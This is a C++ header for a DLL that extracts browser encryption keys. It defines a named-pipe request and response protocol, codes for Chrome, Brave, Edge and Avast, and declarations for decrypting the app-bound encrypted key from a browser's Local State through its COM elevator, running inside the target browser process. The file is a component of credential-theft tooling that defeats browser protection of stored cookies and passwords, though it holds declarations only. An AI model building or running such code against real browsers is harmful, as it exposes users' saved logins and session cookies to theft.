// Key extraction DLL: shared protocol + in-browser responder side.

#pragma once

#include "../core/common.hpp"
#include <cstdint>
#include <string>

namespace KeyDll {

    // Browser type codes (wire format)
    constexpr uint8_t TYPE_CHROME      = 0;
    constexpr uint8_t TYPE_CHROME_BETA = 1;
    constexpr uint8_t TYPE_BRAVE       = 2;
    constexpr uint8_t TYPE_EDGE        = 3;
    constexpr uint8_t TYPE_AVAST       = 4;

    // Key kind codes (wire format)
    constexpr uint8_t KIND_MAIN = 0;   // app_bound_encrypted_key
    constexpr uint8_t KIND_ASTER = 1;  // aster_app_bound_encrypted_key (Edge Copilot)

    constexpr uint32_t PIPE_MAGIC = 0x4B455942;  // "BEYK"

#pragma pack(push, 1)
    struct Request {
        uint32_t magic;
        uint8_t type;
        uint8_t kind;
    };

    struct ResponseHeader {
        uint32_t magic;
        int32_t status;   // 0 = ok, non-zero = failure (payload = error text)
        uint16_t length;  // payload length
    };
#pragma pack(pop)

    static_assert(sizeof(Request) == 6, "Request must be 6 bytes");
    static_assert(sizeof(ResponseHeader) == 10, "ResponseHeader must be 10 bytes");

    // Set by DllMain in both host and target processes.
    extern HMODULE g_selfModule;

    std::wstring PipeNameFor(uint32_t pid);

    // Reads <User Data>\Local State and decrypts the requested key via the
    // browser's COM elevator. Returns uppercase hex. Throws std::runtime_error.
    std::string ExtractHexKey(uint8_t type, uint8_t kind);

    // Infinite named-pipe server loop, runs on its own thread.
    DWORD WINAPI ResponderProc(LPVOID lpParam);

}
